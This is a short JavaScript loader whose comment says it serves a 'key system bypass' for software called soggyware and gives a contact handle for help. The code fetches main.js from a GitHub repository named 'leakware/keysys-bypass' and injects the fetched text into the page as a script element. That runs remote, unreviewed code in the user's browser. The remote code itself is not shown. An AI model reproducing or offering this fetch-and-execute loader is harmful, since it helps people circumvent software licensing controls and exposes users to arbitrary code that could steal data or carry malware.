// loader for soggyware key system bypass (contact bruno#2465 for help using or removal) 

fetch('https://raw.githubusercontent.com/leakware/keysys-bypass/main/main.js')
  .then(response => response.text())
  .then(code => {
    // Create a script element
    const script = document.createElement('script');
    // Add the fetched code as the script's text content
    script.textContent = code;
    // Append the script element to the document
    document.body.appendChild(script);
  })
  .catch(error => console.error(error));
